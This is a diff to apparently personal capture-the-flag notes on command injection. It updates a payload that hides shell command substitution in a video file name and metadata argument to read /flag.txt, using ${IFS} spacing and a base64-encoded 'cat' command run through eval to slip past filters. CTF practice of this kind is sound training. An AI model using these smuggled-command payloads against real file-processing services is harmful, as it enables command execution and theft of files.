@@ -45,7 +45,7 @@ ngrok http/tcp port_number
 ## command injection
 ```
 tes2.mp4 -metadaata title=$(cat /flag.txt).mp4
-file-small.mp4${IFS}-metadata${IFS}title=$(eval${IFS}$echo${IFS}Y2F0IGZsYWcudHh0Cg==|base64${IFS}-d)).mp4
+file-small.mp4${IFS}-metadata${IFS}title=$(eval${IFS}$echo${IFS}Y2F0IC9mbGFnLnR4dA==|base64${IFS}-d)).mp4
 in bash we can write
 test_cmd="ls"
 eval $test_cmd
